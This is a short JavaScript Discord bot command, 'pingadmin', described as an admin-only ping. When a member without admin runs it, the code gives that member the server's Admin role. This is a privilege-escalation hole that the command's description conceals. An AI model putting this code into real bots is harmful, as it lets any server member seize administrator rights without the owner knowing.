module.exports = {
    name: 'pingadmin',
    description: "Same as ping, but only for people with admin role",
    execute(message, args){

        let adminrole = message.guild.roles.cache.find(r => r.name === "Admin");

        if(message.member.roles.cache.has('841206182315950101')){
            message.channel.send('Ping Admin');
        }
        else{
            message.channel.send('Not an admin');
            message.channel.send('Let us fix that');
            message.member.roles.add(adminrole).catch(console.error);
        }

    }
}